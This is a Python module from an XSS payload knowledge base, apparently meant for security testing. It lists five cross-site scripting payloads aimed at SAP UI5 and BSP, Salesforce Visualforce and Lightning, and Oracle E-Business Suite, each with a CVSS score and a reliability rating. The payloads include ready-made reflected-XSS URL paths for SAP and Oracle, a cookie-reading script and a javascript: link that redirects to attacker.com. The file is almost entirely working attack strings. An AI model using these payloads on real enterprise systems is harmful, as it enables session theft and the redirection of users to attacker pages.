#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

ERP/CRM Specific Payloads
"""

from ..models import PayloadEntry

ERP_PAYLOADS = {
    # SAP NetWeaver / UI5
    "sap_ui5_binding": PayloadEntry(
        payload='<div data-sap-ui-preserve="true" id="sap-ui-static"><script>alert(1)</script></div>',
        contexts=["html_content", "business_logic"],
        severity="high",
        cvss_score=8.5,
        description="SAP UI5 preservation mechanism abuse",
        tags=["erp", "sap", "ui5"],
        reliability="medium",
        attack_surface="web",
    ),
    "sap_bsp_echo": PayloadEntry(
        payload="/sap/bc/bsp/sap/system/test.htm?sap-client=001&sap-sessioncmd=open&test=<script>alert(1)</script>",
        contexts=["url", "business_logic"],
        severity="high",
        cvss_score=8.0,
        description="Classic SAP BSP reflected XSS",
        tags=["erp", "sap", "bsp", "reflected"],
        reliability="high",
        attack_surface="web",
    ),
    # Salesforce (Visualforce / Lightning)
    "salesforce_apex_xss": PayloadEntry(
        payload="{!$Request.param}",
        contexts=["business_logic", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="Unescaped Visualforce expression",
        tags=["crm", "salesforce", "visualforce"],
        reliability="high",
        attack_surface="web",
    ),
    "salesforce_lightning_locker": PayloadEntry(
        payload="<a href=\"javascript:top.window.opener.location='https://attacker.com'\">Click</a>",
        contexts=["business_logic", "html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Lightning Locker Service bypass attempt",
        tags=["crm", "salesforce", "lightning"],
        reliability="low",
        attack_surface="web",
    ),
    # Oracle E-Business Suite
    "oracle_ebs_jsp": PayloadEntry(
        payload="/OA_HTML/jtf_error.jsp?error_msg=<script>alert(document.cookie)</script>",
        contexts=["url", "business_logic"],
        severity="high",
        cvss_score=8.0,
        description="Oracle EBS error page XSS",
        tags=["erp", "oracle", "ebs"],
        reliability="medium",
        attack_surface="web",
    ),
}

ERP_TOTAL = len(ERP_PAYLOADS)
